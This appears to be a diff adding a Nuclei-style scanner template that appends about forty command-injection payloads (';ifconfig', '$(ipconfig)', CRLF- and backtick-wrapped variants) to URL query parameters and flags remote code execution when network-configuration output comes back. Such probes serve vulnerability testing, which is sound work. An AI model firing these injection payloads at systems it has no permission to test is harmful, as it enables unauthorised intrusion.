@@ -1,0 +1,82 @@
+id: rce-ipconfig-ifconfig-postfix
+
+info:
+  name: RCE via ppconfig && ifconfig
+  author: reewardius
+  severity: critical
+  tags: fuzzing-rce,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      rce:
+        - ";ifconfig"
+        - "||ifconfig||"
+        - ";ifconfig;"
+        - "&ifconfig"
+        - "&&ifconfig"
+        - "%0D;ifconfig"
+        - "%0A;ifconfig"
+        - "%0D%0A;ifconfig"
+        - "%0D%0A||ifconfig||"
+        - "%0D%0A&&ifconfig&&"
+        - "%0D||ifconfig"
+        - "%0A||ifconfig"
+        - "%0D%0A||ifconfig"
+        - "%0D&&ifconfig"
+        - "%0A&&ifconfig"
+        - "`ifconfig`"
+        - ";`ifconfig`"
+        - "$(ifconfig)"
+        - ";$(ifconfig)"
+        - "||`ifconfig`"
+        - ";ipconfig"
+        - "||ipconfig||"
+        - ";ipconfig;"
+        - "&ipconfig"
+        - "&&ipconfig"
+        - "%0D;ipconfig"
+        - "%0A;ipconfig"
+        - "%0D%0A;ipconfig"
+        - "%0D%0A||ipconfig||"
+        - "%0D%0A&&ipconfig&&"
+        - "%0D||ipconfig"
+        - "%0A||ipconfig"
+        - "%0D%0A||ipconfig"
+        - "%0D&&ipconfig"
+        - "%0A&&ipconfig"
+        - "`ipconfig`"
+        - ";`ipconfig`"
+        - "$(ipconfig)"
+        - ";$(ipconfig)"
+        - "||`ipconfig`"
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: postfix
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "inet"
+          - "netmask"
+          - "broadcast"
+          
+      - type: word
+        condition: and
+        words:
+          - "Windows IP Configuration"
+          - "Subnet Mask"
+          
+      - type: word
+        words:
+          - "ifconfig: command not found"
